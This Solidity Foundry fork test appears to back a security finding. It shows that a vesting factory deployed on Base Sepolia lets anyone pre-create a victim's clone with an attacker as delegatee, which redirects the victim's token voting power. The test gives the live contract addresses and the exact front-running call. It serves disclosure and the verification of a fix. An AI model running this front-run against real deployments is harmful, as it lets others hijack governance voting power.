// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { Test } from "forge-std/Test.sol";

/// Minimal interfaces for the LIVE (pre-fix, 4-arg) contracts deployed on Base Sepolia.
interface ILegacyVestingFactory {
    function getOrCreateVesting(
        address token,
        address beneficiary,
        uint64 startTimestamp,
        address delegatee
    ) external returns (address);
    function predictVestingAddress(
        address token,
        address beneficiary,
        uint64 startTimestamp
    ) external view returns (address);
}

interface IVotesLike {
    function delegates(address account) external view returns (address);
}

interface IVestingClone {
    function beneficiary() external view returns (address);
    function initialized() external view returns (bool);
}

/// @title Fork proof: the vesting delegatee front-run is LIVE on the Base Sepolia deployment
/// @notice Validates the PR #190 finding against the ACTUAL deployed bytecode (not the local harness).
///         The deployed `TNTVestingFactory.getOrCreateVesting` still takes a caller-supplied delegatee
///         that is not part of the CREATE2 salt, so a front-runner can pre-create a claimant's vesting
///         clone and redirect its voting power on the real ERC20Votes `TangleToken`.
/// @dev Requires network access to https://sepolia.base.org. Skips cleanly if the fork is unreachable
///      so it never red-fails CI in a sandboxed/offline runner.
contract Fork_MigrationClaim_VestingFrontRun_BaseSepolia is Test {
    // From broadcast/FullDeploy.s.sol/84532/run-latest.json
    address constant VESTING_FACTORY = 0x45C1744354a4389A3d63A6e213A100D91243975a;
    address constant TANGLE_TOKEN = 0xB54652795cE3DFFD706a197D42dD978b60F0D3Fa;

    function test_fork_frontRunHijacksVotingPower_onLiveDeployment() public {
        try vm.createSelectFork("https://sepolia.base.org") {
            // forked successfully
        } catch {
            vm.skip(true);
            return;
        }
        // Bail out gracefully if this RPC snapshot predates the deployment.
        if (VESTING_FACTORY.code.length == 0 || TANGLE_TOKEN.code.length == 0) {
            vm.skip(true);
            return;
        }

        ILegacyVestingFactory factory = ILegacyVestingFactory(VESTING_FACTORY);
        address victim = makeAddr("fork-victim");
        address attacker = makeAddr("fork-attacker");
        uint64 startTs = uint64(block.timestamp);

        // Fresh victim => clone not yet deployed at the predicted (salt-bound) address.
        address predicted = factory.predictVestingAddress(TANGLE_TOKEN, victim, startTs);
        if (predicted.code.length != 0) {
            vm.skip(true);
            return;
        }

        // Front-run: anyone can pre-create the victim's clone with an ATTACKER delegatee
        // (delegatee is not part of the salt) on the live, deployed factory.
        vm.prank(attacker);
        address clone = factory.getOrCreateVesting(TANGLE_TOKEN, victim, startTs, attacker);

        assertEq(clone, predicted, "live factory created the victim's predicted clone address");
        assertTrue(IVestingClone(clone).initialized(), "clone initialized by the front-run");
        assertEq(IVestingClone(clone).beneficiary(), victim, "beneficiary is the victim (salt-bound)");

        // LIVE BUG: the victim's vesting clone delegates its voting power to the attacker on the real
        // ERC20Votes TangleToken. PR #190 (force delegatee == beneficiary) is what closes this in prod.
        assertEq(
            IVotesLike(TANGLE_TOKEN).delegates(clone),
            attacker,
            "LIVE on Base Sepolia: victim clone delegates voting power to attacker"
        );
    }
}
